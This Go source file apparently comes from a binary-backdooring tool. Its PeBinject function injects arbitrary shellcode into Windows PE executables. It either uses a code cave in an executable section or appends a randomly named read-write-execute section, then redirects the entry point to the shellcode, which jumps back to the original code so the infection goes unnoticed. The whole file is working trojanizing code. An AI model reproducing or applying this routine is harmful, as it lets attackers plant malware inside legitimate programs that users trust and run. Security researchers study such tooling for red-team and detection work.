package bj

import (
	"bytes"
	"encoding/binary"
	"math/rand"

	"github.com/Binject/debug/pe"
	"github.com/Binject/shellcode/api"
)

// PeBinject - Inject shellcode into an PE binary
func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {

	// Open File and Extract Needed Fields
	peFile, err := pe.NewFile(bytes.NewReader(sourceBytes))
	if err != nil {
		return nil, err
	}
	var entryPoint, sectionAlignment, fileAlignment uint32
	hdr64 := (peFile.OptionalHeader).(*pe.OptionalHeader64)
	if hdr64 == nil {
		hdr32 := (peFile.OptionalHeader).(*pe.OptionalHeader32)
		entryPoint = hdr32.AddressOfEntryPoint
		sectionAlignment = hdr32.SectionAlignment
		fileAlignment = hdr32.FileAlignment
	} else {
		entryPoint = hdr64.AddressOfEntryPoint
		sectionAlignment = hdr64.SectionAlignment
		fileAlignment = hdr64.FileAlignment
	}
	shellcodeLen := len(shellcodeBytes) + 5 // 5 bytes get added later by AppendSuffixJmp

	// Code Cave Method
	for _, section := range peFile.Sections {
		flags := section.Characteristics
		if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we do the TLS section or other non-X sections?
			// this section is executable
			data, err := section.Data()
			if err != nil {
				return nil, err
			}
			caves, err := FindCaves(data)
			if err != nil {
				return nil, err
			}
			for _, cave := range caves {
				if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(shellcodeLen) {
					scAddr := section.Offset + uint32(cave.Start)
					shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
					peFile.InsertionAddr = scAddr
					peFile.InsertionBytes = shellcode
					return peFile.Bytes()
				}
			}
		}
	}

	// Add a New Section Method (most common)
	/*

				SH[FH->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, OH->SectionAlignment, 0);
				SH[FH->NumberOfSections].VirtualAddress = align(SH[FH->NumberOfSections - 1].Misc.VirtualSize, OH->SectionAlignment, SH[FH->NumberOfSections - 1].VirtualAddress);
				SH[FH->NumberOfSections].SizeOfRawData = align(sizeOfSection, OH->FileAlignment, 0);
				SH[FH->NumberOfSections].PointerToRawData = align(SH[FH->NumberOfSections - 1].SizeOfRawData, OH->FileAlignment, SH[FH->NumberOfSections - 1].PointerToRawData);
				SH[FH->NumberOfSections].Characteristics = 0xE00000E0;


		       //now lets change the size of the image,to correspond to our modifications
		      //by adding a new section,the image size is bigger now
		      OH->SizeOfImage = SH[FH->NumberOfSections].VirtualAddress + SH[FH->NumberOfSections].Misc.VirtualSize;
		       //and we added a new section,so we change the NOS too
			   	FH->NumberOfSections += 1;
	*/

	lastSection := peFile.Sections[peFile.NumberOfSections-1]
	newsection := new(pe.Section)
	newsection.Name = "." + RandomString(6)
	newsection.VirtualSize = align(uint32(shellcodeLen), sectionAlignment, 0)
	newsection.VirtualAddress = align(lastSection.VirtualSize, sectionAlignment, lastSection.VirtualAddress)
	newsection.Size = align(uint32(shellcodeLen), fileAlignment, 0)                //SizeOfRawData
	newsection.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) //PointerToRawData
	newsection.Characteristics = 0xE00000E0

	//    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
	//                 IMAGE_SCN_CNT_CODE  |
	//                 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
	//                 IMAGE_SCN_MEM_EXECUTE |
	//                 IMAGE_SCN_CNT_INITIALIZED_DATA |
	//                 IMAGE_SCN_MEM_READ

	scAddr := newsection.Offset
	shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
	peFile.InsertionAddr = scAddr
	peFile.InsertionBytes = shellcode

	if hdr64 == nil {
		hdr32 := (peFile.OptionalHeader).(*pe.OptionalHeader32)
		hdr32.SizeOfImage = newsection.VirtualAddress + newsection.VirtualSize
		hdr32.AddressOfEntryPoint = newsection.VirtualAddress
	} else {
		hdr64.SizeOfImage = newsection.VirtualAddress + newsection.VirtualSize
		hdr64.AddressOfEntryPoint = newsection.VirtualAddress
	}
	peFile.FileHeader.NumberOfSections++
	peFile.Sections = append(peFile.Sections, newsection)

	return peFile.Bytes()
}

func align(size, align, addr uint32) uint32 {
	if 0 == (size % align) {
		return addr + size
	}
	return addr + (size/align+1)*align
}

// RandomString - generates random string of given length
func RandomString(len int) string {
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		bytes[i] = byte(97 + rand.Intn(25)) //a=97
	}
	return string(bytes)
}
